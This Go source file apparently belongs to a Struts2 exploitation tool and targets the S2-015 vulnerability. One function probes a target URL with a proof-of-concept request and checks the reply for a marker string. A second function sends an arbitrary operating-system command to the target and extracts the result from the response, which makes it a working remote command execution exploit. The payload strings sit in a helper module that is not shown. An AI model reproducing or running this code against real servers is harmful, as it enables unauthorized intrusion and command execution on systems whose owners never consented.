package s015

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
	"net/url"
)

func Check(targeturl string){
	targeturl+=x51utils.POC_s015_check
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	isVulnable := strings.Contains(respBody, "6308")
	if isVulnable {
		x51utils.Colorlog("Found Struts2-015!")

	} else {
		fmt.Println("Struts2-015 Not Vulnerable.")
	}
}
func ExecCommand(targeturl string,command string) {
	targeturl += x51utils.POC_s015_exec(command)
	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	client := &http.Client{Timeout: time.Second * 10}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error reading response. ")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	respBody := string(body)
	//正则提取命令结果
	outre :=regexp.MustCompile(`(x51).*?(x51)`)
	s015out := outre.FindStringSubmatch(respBody)
	s015outdecode,_ := url.QueryUnescape(s015out[0])
	fmt.Println(strings.Replace(s015outdecode,"x51","",-1))
	//fmt.Println(respBody)
}